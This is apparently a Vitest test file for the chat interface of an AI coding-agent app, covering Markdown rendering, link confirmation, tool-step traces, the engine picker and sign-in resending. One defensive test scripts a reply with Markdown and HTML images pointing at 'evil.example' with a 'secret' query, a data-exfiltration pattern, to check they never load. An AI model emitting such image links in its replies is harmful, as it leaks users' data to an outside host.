// @vitest-environment jsdom
import { useChat } from "@ai-sdk/react";
import { type AiSdkChat, createChat } from "@shadcn/helpers/ai-sdk";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { createMemoryHistory, createRootRoute, createRouter, RouterProvider } from "@tanstack/react-router";
import { cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import { createUIMessageStream, createUIMessageStreamResponse } from "ai";
import { type ReactNode, useState } from "react";
import { afterEach, beforeAll, describe, expect, it, vi } from "vitest";
import { ActorContext } from "../src/actor.ts";
import { DECLARE_BOX } from "../src/api.ts";
import { ChatColumn } from "../src/components/shell/chat.tsx";
import { Composer } from "../src/components/shell/composer.tsx";
import { ConnectAgent } from "../src/components/shell/connect-agent.tsx";
import sanoma from "../src/icon-small.svg?url";
import { Thread } from "../src/components/shell/thread.tsx";
import type { AppConfig } from "../src/api.ts";
import { chatModelQuery, chatQuery, chatsQuery, configQuery } from "../src/queries.ts";
import { type ChatMessage, engineName, engineOf, enginesHere, enginesOf } from "../src/lib/chat.ts";

// The chat's thread on a scripted conversation (`createChat`) through the real `useChat`: no model,
// no server and no database, so what the column draws of each part is what is under test. The
// column itself, over a stored transcript, sends its turns to a stubbed `fetch`.
// `chat.test.ts`, `harness.test.ts` and `acp.test.ts` drive the turn itself.

// The server functions, which only Start's build keeps out of a browser module: the thread calls none.
vi.mock(
  "../src/functions.ts",
  () =>
    new Proxy(
      {},
      {
        has: () => true,
        get: (_, name) =>
          name === "then"
            ? undefined
            : () => {
                throw new Error(`The thread called ${String(name)}`);
              },
      },
    ),
);

// A public site's languages, from the build's virtual module, which the column's crumbs read: no site here.
vi.mock("../src/lib/locales.ts", () => ({ siteOf: () => undefined }));

beforeAll(async () => {
  // The reply's lazy renderer, loaded ahead so no test's wait is spent transforming it.
  await import("../src/components/shell/markdown.tsx");
  await import("../src/components/shell/fence.tsx");
  // What jsdom lacks and the message scroller reads.
  for (const name of ["ResizeObserver", "IntersectionObserver"]) {
    vi.stubGlobal(
      name,
      class {
        observe() {}
        unobserve() {}
        disconnect() {}
        takeRecords() {
          return [];
        }
      },
    );
  }
  Element.prototype.scrollTo = () => {};
});
afterEach(cleanup);

type Script = AiSdkChat<ChatMessage>;

function Scripted({ script, onSend = () => {} }: { script: Script; onSend?: (text: string) => void }) {
  const { messages, sendMessage, status, error } = useChat<ChatMessage>({
    messages: script.get(0) as ChatMessage[],
    transport: script.transport({ delayMs: 0 }) as never,
  });
  const next = script.next(messages);
  return (
    <>
      <Thread chat="chat" messages={messages} status={status} error={error} onSend={onSend} canContinue />
      <button type="button" disabled={!next} onClick={() => next && void sendMessage(next as ChatMessage)}>
        Next turn
      </button>
    </>
  );
}

/** Draws `page` in the app's router and query client (`queryClient`), which holds `config` when given. */
function draw(page: () => ReactNode, config?: AppConfig, queryClient = new QueryClient()) {
  const router = createRouter({ routeTree: createRootRoute({ component: page }), history: createMemoryHistory() });
  if (config) queryClient.setQueryData(configQuery().queryKey, config);
  render(
    <QueryClientProvider client={queryClient}>
      <RouterProvider router={router} />
    </QueryClientProvider>,
  );
}

/** Draws the thread and sends the script's first message. */
async function play(script: Script, onSend?: (text: string) => void) {
  draw(() => <Scripted script={script} onSend={onSend} />);
  fireEvent.click(await screen.findByRole("button", { name: "Next turn" }));
}

describe("the chat's thread", () => {
  it("draws the person's turn as the scroller's anchor and a reply as Markdown", async () => {
    await play(
      createChat<ChatMessage>()
        .user("What changed?")
        .assistant("The **draft** changed:\n\n- `a.ts`\n- [the docs](https://example.com/docs)"),
    );
    const log = await screen.findByRole("log");
    const strong = await within(log).findByText("draft");
    expect(strong.tagName).toBe("STRONG");
    expect(within(log).getByText("a.ts").tagName).toBe("CODE");
    // A link asks before it opens (see below), so it is a button.
    const link = within(log).getByRole("button", { name: "the docs" });
    // In the reply's own colour and weight, Streamdown's merged away.
    expect(link.className).toContain("text-current");
    expect(link.className).not.toContain("text-primary");
    const anchor = within(log).getByText("What changed?").closest("[data-scroll-anchor]");
    expect(anchor?.getAttribute("data-scroll-anchor")).toBe("true");
    expect(strong.closest("[data-scroll-anchor]")?.getAttribute("data-scroll-anchor")).not.toBe("true");
    await within(log).findByRole("button", { name: "Copy" });
  });

  it("keeps a task list's own classes beside the app's", async () => {
    await play(createChat<ChatMessage>().user("Plan?").assistant("- [x] Read it\n- [ ] Fix it"));
    const item = await waitFor(() => {
      const found = screen.getByText("Read it").closest("li");
      expect(found?.className).toContain("task-list-item");
      return found as HTMLElement;
    });
    expect(item.closest("ul")?.className).toMatch(/contains-task-list.*list-disc|list-disc.*contains-task-list/);
  });

  it("draws a fenced block as a code block, with its copy", async () => {
    await play(createChat<ChatMessage>().user("Show me").assistant("Here:\n\n```ts\nconst a = 1;\n```"));
    // Once its chunk has come, in place of the plain block.
    const block = await waitFor(() => {
      const found = document.querySelector<HTMLElement>('[data-slot="code-block"]');
      expect(found && within(found).queryByRole("button", { name: "Copy" })).not.toBeNull();
      return found as HTMLElement;
    });
    expect(block.textContent).toContain("const a = 1;");
    expect(block.closest("pre")).toBeNull();
    // Its language reached the highlighter: the tokens carry their colours.
    await waitFor(() => expect(block.querySelector('[data-slot="code-block-line"] span[style]')).not.toBeNull(), {
      timeout: 10_000,
    });
    expect(screen.getByText("Here:").closest('[data-slot="code-block"]')).toBeNull();
  });

  it("shows a tag the reply names as the text it is", async () => {
    await play(
      createChat<ChatMessage>().user("Show me").assistant("Wrap it in <Thread /> and type it as Array<string>."),
    );
    expect(await screen.findByText("Wrap it in <Thread /> and type it as Array<string>.")).toBeTruthy();
  });

  it("asks before a link the agent wrote opens", async () => {
    const open = vi.spyOn(window, "open").mockImplementation(() => null);
    await play(createChat<ChatMessage>().user("Where?").assistant("See [the docs](https://example.com/docs)."));
    fireEvent.click(await screen.findByRole("button", { name: "the docs" }));
    const dialog = await screen.findByRole("dialog", { name: "Open this link?" });
    expect(within(dialog).getByText("https://example.com/docs")).toBeTruthy();
    expect(open).not.toHaveBeenCalled();
    fireEvent.click(within(dialog).getByRole("button", { name: "Open" }));
    expect(open).toHaveBeenCalledExactlyOnceWith("https://example.com/docs", "_blank", "noreferrer");
    open.mockRestore();
  });

  it("asks before any link opens, however it is written, but an in-page anchor", async () => {
    await play(
      createChat<ChatMessage>()
        .user("Who?")
        .assistant(
          "Write to [us](mailto:hello@example.com), or see [this](//example.com/x), [that](/inbox) and [below](#end).",
        ),
    );
    expect((await screen.findByRole("link", { name: "below" })).getAttribute("href")).toBe("#end");
    expect(screen.getByRole("button", { name: "us" })).toBeTruthy();
    expect(screen.getByRole("button", { name: "that" })).toBeTruthy();
    fireEvent.click(screen.getByRole("button", { name: "this" }));
    expect(await screen.findByRole("dialog", { name: "Open this link?" })).toBeTruthy();
  });

  it("loads no image a reply names, by Markdown or by HTML", async () => {
    await play(
      createChat<ChatMessage>()
        .user("Read the page")
        .assistant('Done. ![x](https://evil.example/?d=secret)\n\n<img src="https://evil.example/?d=raw" />'),
    );
    // The turn over, and past the plain text shown until the renderer's chunk comes.
    await screen.findByRole("button", { name: "Copy" });
    // The Markdown image is dropped; the HTML one is the text it is, never an element.
    await waitFor(() => expect(screen.getByRole("log").textContent).not.toContain("d=secret"));
    expect(screen.getByRole("log").textContent).toContain('<img src="https://evil.example/?d=raw" />');
    expect(document.querySelector("img")).toBeNull();
    expect(screen.getByRole("log").textContent).toContain("Done.");
  });

  it("draws thinking and steps as one trace, thinking open only while it streams", async () => {
    await play(
      createChat<ChatMessage>()
        .user("Fix it")
        .assistant(({ writer }) => {
          writer.reasoning("Looking at the file", { delayMs: 60 }).stepStart();
          writer.tool("read_file", { input: { path: "a.ts" }, output: { text: "x" } as never });
          writer.stepStart();
          writer.tool("edit_file", { input: { path: "b.ts" } as never }).error("no such text");
          writer.text("Tried.");
        }),
    );
    await screen.findByText(/^Looking/);
    expect(screen.getByText("Thinking")).toBeTruthy();
    await screen.findByText("Thought");
    await screen.findByText("Tried.");
    const trace = document.querySelectorAll('[data-slot="trace"]');
    expect(trace).toHaveLength(1);
    const lines = within(trace[0] as HTMLElement);
    expect(lines.getByText("Read a.ts").textContent).toBe("Done: Read a.ts");
    expect(lines.getByText("Edited b.ts").textContent).toBe("Failed: Edited b.ts");
    // Why a step failed is open under it; the thinking folded once it finished.
    expect(lines.getByText("no such text").closest('[data-slot="code-block"]')).not.toBeNull();
    expect(screen.queryByText(/^Looking/)).toBeNull();
  });

  it("marks a step left under way as stopped and offers Continue", async () => {
    const onSend = vi.fn<(text: string) => void>();
    await play(
      createChat<ChatMessage>()
        .user("Fix it")
        .assistant(({ writer }) => {
          writer.tool("read_file", { input: { path: "a.ts" } as never });
        }),
      onSend,
    );
    fireEvent.click(await screen.findByRole("button", { name: "Continue" }));
    expect(onSend).toHaveBeenCalledExactlyOnceWith("continue");
    expect(screen.getByText("Read a.ts").textContent).toBe("Stopped: Read a.ts");
  });

  it("draws an empty chat's start in place of what to ask", async () => {
    draw(() => (
      <Thread
        chat="chat"
        messages={[]}
        status="ready"
        start={<p>Connect your agent</p>}
        onSend={() => {}}
        canContinue
      />
    ));
    expect(await screen.findByText("Connect your agent")).toBeTruthy();
    expect(screen.queryByText("What should change?")).toBeNull();
  });

  it("leaves out the agent's cue to speak first, and sends a suggested ask of the last reply", async () => {
    const onSend = vi.fn<(text: string) => void>();
    await play(
      createChat<ChatMessage>()
        .user("", { metadata: { intro: true } })
        .assistant(({ writer }) => {
          writer.text("Hi, I make the changes.");
          writer.data({ type: "data-suggestions", data: { asks: ["Add a step"] } });
        }),
      onSend,
    );
    const asks = await screen.findByRole("list", { name: "Suggested asks" });
    expect(document.querySelector('[data-slot="bubble"]')).toBeNull();
    fireEvent.click(within(asks).getByRole("button", { name: "Add a step" }));
    expect(onSend).toHaveBeenCalledExactlyOnceWith("Add a step");
  });

  it("says a turn's error, and where to set a missing key", async () => {
    await play(createChat<ChatMessage>().user("Hello").error("No key [connector:anthropic]"));
    const link = await screen.findByRole("link", { name: "Set it on its connector page" });
    expect(link.getAttribute("href")).toBe("/connectors/anthropic");
    expect(screen.getByText(/^No key/)).toBeTruthy();
    expect(screen.queryByRole("button", { name: "Continue" })).toBeNull();
  });
});

/** The coding agents as `describeConfig` lists them, in their connectors' order: marks as its `data:` URLs. */
const mark = (name: string) => ({ src: `data:image/svg+xml,${name}`, dark: `data:image/svg+xml,${name}-dark` });
const AGENTS: AppConfig["agents"] = [
  { id: "copilot", vendor: "github", title: "Copilot", mark: mark("copilot"), own: true },
  {
    id: "claude-code",
    vendor: "anthropic",
    title: "Claude Code",
    mark: { src: "data:image/svg+xml,claude" },
    own: true,
    onKey: { model: "anthropic" },
  },
  { id: "codex", vendor: "openai", title: "Codex", mark: mark("codex"), own: true },
  { id: "opencode", vendor: "opencode", title: "OpenCode", own: true, once: true },
  { id: "pi", vendor: "pi", title: "Pi", mark: mark("pi"), own: true, once: true, onKey: { model: "anthropic" } },
];

/** The marks drawn in `element`, by their `src`: a one-colour mark's dark file after it. */
const marks = (element: Element) => [...element.querySelectorAll("img")].map((img) => img.getAttribute("src"));

/** The names of the engines a chat can open on in `config`. */
const names = (config: AppConfig) => enginesHere(config).map((engine) => engine.name);

/** The Connect your agent cards drawn: each one's title, with its marks. */
const cards = () =>
  [...document.querySelectorAll('[data-slot="item"]')].map((item) => ({
    title: item.querySelector('[data-slot="item-title"]')?.textContent,
    marks: marks(item),
  }));

function EnginePicker() {
  const [value, set] = useState("loop");
  return <Composer busy={false} onSend={() => {}} engine={{ value, set, options: enginesOf(AGENTS) }} />;
}

describe("the chat's composer", () => {
  it("sends on Enter, not on Shift+Enter, and not while busy", async () => {
    const onSend = vi.fn<(text: string) => void>();
    draw(() => <Composer busy={false} onSend={onSend} />);
    const box = await screen.findByRole<HTMLTextAreaElement>("textbox", { name: "Message the agent" });
    expect(screen.getByRole<HTMLButtonElement>("button", { name: "Send" }).disabled).toBe(true);
    fireEvent.change(box, { target: { value: " hello " } });
    fireEvent.keyDown(box, { key: "Enter", shiftKey: true });
    expect(onSend).not.toHaveBeenCalled();
    fireEvent.keyDown(box, { key: "Enter" });
    expect(onSend).toHaveBeenCalledExactlyOnceWith("hello");
    expect(box.value).toBe("");
  });

  it("holds Send and says why while there is a note", async () => {
    const onSend = vi.fn<(text: string) => void>();
    draw(() => <Composer busy={false} onSend={onSend} draft="hello" note={<p>Connect a model</p>} />);
    const send = await screen.findByRole<HTMLButtonElement>("button", { name: "Send" });
    expect(send.disabled).toBe(true);
    expect(screen.getByText("Connect a model").parentElement?.id).toBe(send.getAttribute("aria-describedby"));
    fireEvent.keyDown(screen.getByRole("textbox", { name: "Message the agent" }), { key: "Enter" });
    expect(onSend).not.toHaveBeenCalled();
  });

  it("picks the engine a new chat opens on", async () => {
    draw(() => <EnginePicker />);
    const trigger = await screen.findByRole("button", { name: "Engine: Sanoma" });
    expect(trigger.textContent).toBe("Sanoma");
    fireEvent.click(trigger);
    // Our loop first, a person's own agents last, under a label of their own.
    const engines = await screen.findAllByRole("menuitemradio");
    expect(engines.map((engine) => engine.textContent)).toEqual([
      "Sanoma",
      "Claude Code",
      "Pi",
      "Copilot (your plan)",
      "Claude Code (your plan)",
      "Codex (your plan)",
      "OpenCode (your plan)",
      "Pi (your plan)",
    ]);
    expect(screen.getByText("Your own plan")).toBeTruthy();
    // Each with its agent's mark from its connector, Sanoma's for our loop, none where the connector has none.
    expect(marks(engines[0]!)).toEqual([sanoma]);
    expect(marks(engines[1]!)).toEqual(["data:image/svg+xml,claude"]);
    expect(marks(engines[3]!)).toEqual(["data:image/svg+xml,copilot", "data:image/svg+xml,copilot-dark"]);
    expect(marks(engines[6]!)).toEqual([]);
    fireEvent.click(screen.getByRole("menuitemradio", { name: "Codex (your plan)" }));
    await waitFor(() => expect(trigger.textContent).toBe("Codex (your plan)"));
    expect(trigger.getAttribute("aria-label")).toBe("Engine: Codex (your plan)");
    expect(trigger.querySelector("img")?.getAttribute("src")).toBe("data:image/svg+xml,codex");
  });
});

/** A config of `AGENTS`, on this computer or live, with or without a declared box: what the chat's engines read of it. */
const config = (place: AppConfig["place"], box: boolean) =>
  ({
    agents: AGENTS,
    place,
    resourceTypes: [{ id: "agent37.instance", capabilities: ["sandbox"] }],
    resources: box ? [{ id: "resources/sanoma/infra.ts#box", vendor: "agent37", type: "instance" }] : [],
  }) as unknown as AppConfig;

describe("the chat's engines", () => {
  it("reads every name a chat or the cookie has kept as its agent and the account it runs on, and back", () => {
    for (const [name, engine] of [
      ["loop", { agent: "loop", plan: "onKey" }],
      ["claude-code", { agent: "claude-code", plan: "onKey" }],
      ["pi", { agent: "pi", plan: "onKey" }],
      ["acp-claude-code", { agent: "claude-code", plan: "own" }],
      ["acp-codex", { agent: "codex", plan: "own" }],
    ] as const) {
      expect(engineOf(name), name).toEqual(engine);
      expect(engineName(engine)).toBe(name);
    }
  });

  it("offers every installed agent's plans on this computer, and on a live instance only what runs there", () => {
    const all = enginesOf(AGENTS).map((engine) => engine.name);
    expect(names(config("this-computer", false))).toEqual(all);
    // Live, an own plan that signs in by a command run once on the person's computer is no choice.
    expect(names(config("live", true))).toEqual(all.filter((name) => name !== "acp-opencode" && name !== "acp-pi"));
    // Live with no box declared, no coding agent runs: only our loop.
    expect(names(config("live", false))).toEqual(["loop"]);
  });
});

describe("Connect your agent", () => {
  const choose = vi.fn<(engine: string) => void>();

  it("offers each installed agent's own plan with its mark, and opens the chat on the one chosen", async () => {
    draw(() => <ConnectAgent onChoose={choose} />, config("this-computer", false));
    fireEvent.click(await screen.findByRole("button", { name: "Sign in with Claude" }));
    expect(choose).toHaveBeenLastCalledWith("acp-claude-code");
    expect(screen.getByText(/^Other agents \(Copilot, OpenCode, Pi\)/)).toBeTruthy();
    fireEvent.click(screen.getByRole("button", { name: "More agents" }));
    await waitFor(() => expect(cards()).toHaveLength(6));
    expect(cards()).toEqual([
      { title: "Your Claude plan Recommended", marks: ["data:image/svg+xml,claude"] },
      { title: "Your ChatGPT plan", marks: ["data:image/svg+xml,codex", "data:image/svg+xml,codex-dark"] },
      { title: "An API key", marks: [] },
      { title: "Copilot", marks: ["data:image/svg+xml,copilot", "data:image/svg+xml,copilot-dark"] },
      { title: "OpenCode", marks: [] },
      { title: "Pi", marks: ["data:image/svg+xml,pi", "data:image/svg+xml,pi-dark"] },
    ]);
  });

  it("offers no agent live whose sign-in runs once on the person's computer", async () => {
    draw(() => <ConnectAgent onChoose={choose} />, config("live", true));
    expect(await screen.findByRole("button", { name: "Sign in with Claude" })).toBeTruthy();
    expect(screen.getByText(/^Other agents \(Copilot\)/)).toBeTruthy();
  });

  it("says, live with no box declared, what to declare in place of the Claude plan's sign-in", async () => {
    draw(() => <ConnectAgent onChoose={choose} />, config("live", false));
    expect(await screen.findByText(`${DECLARE_BOX}.`)).toBeTruthy();
    expect(screen.queryByRole("button", { name: "Sign in with Claude" })).toBeNull();
    expect(screen.queryByText(/Other agents/)).toBeNull();
  });
});

const ASK = "Change the price to 6 dollars";
const asked: ChatMessage = { id: "m1", role: "user", parts: [{ type: "text", text: ASK }] };
const intro: ChatMessage = { id: "m1", role: "user", parts: [{ type: "text", text: "" }], metadata: { intro: true } };
const signedIn: ChatMessage = {
  id: "m2",
  role: "assistant",
  parts: [{ type: "data-signIn", id: "sign-in", data: { agent: "Claude Code", state: "done" } }],
};

type Writer = Parameters<Parameters<typeof createUIMessageStream<ChatMessage>>[0]["execute"]>[0]["writer"];
/** A reply that is `text`. */
const says = (text: string) => (writer: Writer) => {
  writer.write({ type: "text-start", id: "t" });
  writer.write({ type: "text-delta", id: "t", delta: text });
  writer.write({ type: "text-end", id: "t" });
};
/** A reply whose turn ended in the agent's sign-in, `state`. */
const signsIn = (state: "done" | "failed") => (writer: Writer) =>
  writer.write({ type: "data-signIn", id: "sign-in", data: { agent: "Claude Code", state, text: "it stopped" } });

/**
 * Opens the column on a chat of Claude Code on the person's plan, stored as `messages`; each turn
 * the column sends is answered by the next of `replies`, then by "Done.". Returns what it sent,
 * each request's body.
 */
function openColumn(messages: ChatMessage[], replies: ((writer: Writer) => void)[] = []) {
  const send = vi.spyOn(globalThis, "fetch").mockImplementation(async () => {
    const reply = replies.shift() ?? says("Done.");
    return createUIMessageStreamResponse({
      stream: createUIMessageStream<ChatMessage>({ execute: ({ writer }) => reply(writer) }),
    });
  });
  const chat = { id: "c1", person: "ada", engine: "acp-claude-code", title: "Change the price", createdAt: 0 };
  // What the column reads, as read: none is asked again.
  const queryClient = new QueryClient({ defaultOptions: { queries: { staleTime: Number.POSITIVE_INFINITY } } });
  queryClient.setQueryData(chatsQuery().queryKey, [chat] as never);
  queryClient.setQueryData(chatQuery(chat.id).queryKey, { chat, messages } as never);
  queryClient.setQueryData(chatModelQuery().queryKey, { ready: true } as never);
  draw(
    () => (
      <ActorContext.Provider value={{ actor: "ada", groups: [], fromServer: false, setActor: () => {} }}>
        <ChatColumn engine={{ set: () => {} }} />
      </ActorContext.Provider>
    ),
    config("this-computer", false),
    queryClient,
  );
  return () => send.mock.calls.map(([, init]) => JSON.parse(String(init?.body)) as Record<string, unknown>);
}

/** Types `text` in the composer and sends it. */
async function write(text: string) {
  const box = await screen.findByRole("textbox", { name: "Message the agent" });
  fireEvent.change(box, { target: { value: text } });
  fireEvent.keyDown(box, { key: "Enter" });
}

/** Long enough for a send the column started to reach `fetch`. */
const settled = () => new Promise((resolve) => setTimeout(resolve, 100));

describe("the chat column after a sign-in", () => {
  afterEach(() => vi.restoreAllMocks());

  it("sends the person's message again once the sign-in is done, once", async () => {
    const sent = openColumn([], [signsIn("done"), says("Changed it to 6 dollars.")]);
    await write(ASK);
    expect(await screen.findByText("Changed it to 6 dollars.")).toBeTruthy();
    await settled();
    expect(sent()).toHaveLength(2);
    expect(sent()[1]).toMatchObject({
      id: "c1",
      engine: "acp-claude-code",
      message: { role: "user", parts: [{ type: "text", text: ASK }] },
    });
    expect(sent()[1]!.start).toBeUndefined();
    // The card says it is signed in, and no more asks the person to send it again.
    const card = within(screen.getByRole("region", { name: "Sign in to Claude Code" }));
    expect(card.getByText("Signed in to Claude Code.")).toBeTruthy();
    expect(card.queryByText(/again/)).toBeNull();
    // The message as sent again, under the card.
    expect(screen.getAllByText(ASK)).toHaveLength(2);
  });

  it("sends nothing for a sign-in the chat was opened on: it may be old, or sent again already", async () => {
    const sent = openColumn([asked, signedIn]);
    expect(await screen.findByText("Signed in to Claude Code.")).toBeTruthy();
    await settled();
    expect(sent()).toEqual([]);
  });

  it("lets the agent speak first again in a chat the person has not written in", async () => {
    const sent = openColumn([intro, signedIn], [says("Hi, I make the changes.")]);
    expect(await screen.findByText("Hi, I make the changes.")).toBeTruthy();
    expect(sent()).toHaveLength(1);
    expect(sent()[0]).toMatchObject({
      engine: "acp-claude-code",
      start: true,
      message: { role: "user", parts: [{ type: "text", text: "" }], metadata: { intro: true } },
    });
  });

  it("sends nothing after a sign-in that failed", async () => {
    const sent = openColumn([], [signsIn("failed")]);
    await write(ASK);
    expect(await screen.findByText(/^The sign-in did not finish: it stopped\./)).toBeTruthy();
    await settled();
    expect(sent()).toHaveLength(1);
  });

  it("sends the message again only once when that turn ends in a sign-in too", async () => {
    const sent = openColumn([], [signsIn("done"), signsIn("done")]);
    await write(ASK);
    await waitFor(() => expect(screen.getAllByText("Signed in to Claude Code.")).toHaveLength(2));
    await settled();
    expect(sent()).toHaveLength(2);
  });
});
